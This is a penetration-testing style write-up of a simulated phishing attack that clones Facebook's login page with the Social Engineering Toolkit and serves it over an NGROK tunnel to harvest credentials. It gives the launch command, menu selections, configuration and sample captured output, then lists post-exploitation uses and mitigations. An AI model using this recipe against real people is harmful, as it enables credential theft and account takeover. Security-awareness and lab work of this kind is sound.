# Credential Harvesting via Phishing Attack – Facebook Clone

---

## 1. Summary

**Objective:**  
Simulate a credential harvesting attack targeting Facebook users by deploying a phishing campaign using the **Social Engineering Toolkit (SET)**. The intent was to demonstrate how attackers can gather valid credentials for potential post-exploitation actions.

**Method:**  
A cloned version of Facebook’s login page was hosted on a Kali Linux virtual machine using SET. The site was made publicly accessible via an NGROK tunnel and delivered to the target to collect login credentials.

---

## 2. Tools and Environment

- **Operating System:** Kali Linux (VM)
- **Tool Used:** Social Engineering Toolkit (SET)
- **Tunnel Service:** NGROK
- **Targeted Service:** Facebook (cloned login interface)

---

## 3. Attack Chain

### 3.1 Launching SET

Executed the following command:

```bash
sudo setoolkit
Selected the following options:

1) Social-Engineering Attacks

2) Website Attack Vectors

3) Credential Harvester Attack Method

2) Site Cloner

3.2 Cloning the Target
Cloning URL: http://facebook.com

IP Address / NGROK URL: <NGROK_URL>

Note: HTTPS was avoided to prevent certificate mismatch issues.

Example configuration:

bash
Copy
Edit
IP address for the POST back: <NGROK_URL>
Website to clone: http://facebook.com
SET cloned the target site and hosted it locally via Apache.

4. Delivery Mechanism
The cloned page was shared via the NGROK URL. Delivery can occur through various social engineering methods:

Phishing emails

SMS messages

Fake support calls

⚠️ Disclaimer: Delivery methods were not the focus of this exercise.

5. Execution and Result
5.1 Victim Interaction
When the victim clicked the NGROK link, the Facebook login clone was displayed. Upon entering credentials, the data was captured and shown on the attacker's terminal.

Captured fields:

Email / Phone

Password

5.2 Captured Output
Example:

yaml
Copy
Edit
[*] WE GOT A HIT! Printing the output:
PARAM: email=targetuser@example.com
PARAM: pass=supersecretpassword123
6. Post-Exploitation Potential
Captured credentials may allow:

Unauthorized access to Facebook or associated accounts

Credential reuse in other platforms

Social engineering via phone/email

MFA bypass attempts via SIM swap or phishing

7. Mitigation Recommendations
Enforce HTTPS and HSTS

Enable multi-factor authentication

Educate users on phishing tactics

Use anti-phishing browser extensions

Monitor for cloned or typosquatted domains

8. Conclusion
This phishing exercise successfully demonstrated how an attacker could use SET to clone a legitimate website and capture credentials. Despite its simplicity, the method is effective and reinforces the need for strong security awareness and defensive controls.

Performed by:
Marcelo Lones
Cybersecurity Analyst / Offensive Security Enthusiast

